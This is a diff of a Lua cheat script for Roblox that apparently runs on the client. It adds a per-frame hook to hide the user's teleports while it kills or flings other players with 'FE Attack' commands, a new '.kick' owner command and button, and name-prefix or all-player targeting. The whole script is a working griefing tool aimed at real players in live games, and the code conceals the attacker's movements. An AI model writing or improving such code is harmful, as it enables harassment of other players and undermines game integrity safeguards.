@@ -6491,6 +6491,16 @@ local function PerformFEAction(cmd, targetPlayer)
 
     local oldCF = hrp.CFrame
     
+    -- INVISIBLE PHYSICS: Force HRP back on RenderStepped to hide teleport from camera
+    local renderConn
+    if chatterData == plr then
+        renderConn = RunService.RenderStepped:Connect(function()
+            hrp.CFrame = oldCF
+            hrp.AssemblyLinearVelocity = Vector3.zero
+            hrp.AssemblyAngularVelocity = Vector3.zero
+        end)
+    end
+    
     if cmd == ".kill" or cmd == ".fling" then
         SendNotify("⚔️ FE Attack", (cmd == ".kill" and "Killing " or "Flinging ") .. targetPlayer.DisplayName, 3)
         
@@ -6534,6 +6544,8 @@ local function PerformFEAction(cmd, targetPlayer)
         -- FINAL MOMENTUM RESET
         hrp.AssemblyLinearVelocity = Vector3.zero
         hrp.AssemblyAngularVelocity = Vector3.zero
+        
+        if renderConn then renderConn:Disconnect() end
     elseif cmd == ".bring" then
         SendNotify("🔄 FE Bring", "Attempting FE Bring on " .. targetPlayer.DisplayName, 3)
         hrp.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 2)
@@ -6558,9 +6570,12 @@ local function PerformFEAction(cmd, targetPlayer)
         FrozenPlayers[targetPlayer.UserId] = nil
         SendNotify("🔓 FE Unfreeze", "Unfreezing " .. targetPlayer.DisplayName, 3)
     end
+    
+    if renderConn then renderConn:Disconnect() end
 end
 
 local function handleOwnerCommand(chatterData, msg)
+    task.spawn(function() -- INSTANT COMMAND EXECUTION
     if not msg then return end
     local lmsg = msg:lower()
 
@@ -6615,7 +6630,8 @@ local function handleOwnerCommand(chatterData, msg)
         
         if not targetStr then return end
 
-        -- Identify ALL potential targets for the FE engine
+        -- Identify ALL potential targets for the FE engine (Optimized)
+        local lTargetStr = targetStr:lower()
         local allTargets = {}
         if targetStr == "*" then
             for _, p in pairs(Players:GetPlayers()) do
@@ -6623,8 +6639,8 @@ local function handleOwnerCommand(chatterData, msg)
             end
         else
             for _, p in pairs(Players:GetPlayers()) do
-                if p.Name:lower():sub(1, #targetStr) == targetStr:lower() or 
-                   p.DisplayName:lower():sub(1, #targetStr) == targetStr:lower() then
+                if p.Name:lower():sub(1, #targetStr) == lTargetStr or 
+                   p.DisplayName:lower():sub(1, #targetStr) == lTargetStr then
                     table.insert(allTargets, p)
                 end
             end
@@ -6702,6 +6718,8 @@ local function handleOwnerCommand(chatterData, msg)
                     if char then char:BreakJoints() end
                     if hum then hum.Health = 0 end
                     SendNotify("👑 Owner Cmd", chatterData.DisplayName .. " used .kill", 3)
+                elseif cmd == ".kick" then
+                    plr:Kick("👑 Owner Kick: You were removed by " .. chatterData.DisplayName)
                 elseif cmd == ".antigrav" then
                     SendNotify("👑 Owner Cmd", chatterData.DisplayName .. " used .antigrav", 3)
                     if hrp and hum then
@@ -6720,12 +6738,8 @@ local function handleOwnerCommand(chatterData, msg)
                 PerformFEAction(cmd, target)
             end
         end
-    else
-        -- Provide feedback if the local player tries an owner command but isn't whitelisted
-        if isDotCmd and chatterData == plr then
-            SendNotify("🔒 Access Denied", "You are not an authorized owner.", 3)
         end
-    end
+    end)
 end
 
 
@@ -6820,7 +6834,7 @@ if isOwner then
     layout.Padding = UDim.new(0, 5)
     layout.HorizontalAlignment = Enum.HorizontalAlignment.Center
     
-    local cmds = {"Bring", "Fling", "Freeze", "Unfreeze", "Kill", "Antigrav", "Say", "Tp"}
+    local cmds = {"Bring", "Fling", "Freeze", "Unfreeze", "Kill", "Antigrav", "Say", "Tp", "Kick"}
     for _, c in ipairs(cmds) do
         local btn = Instance.new("TextButton", btnContainer)
         btn.Size = UDim2.new(0.9, 0, 0, 26)
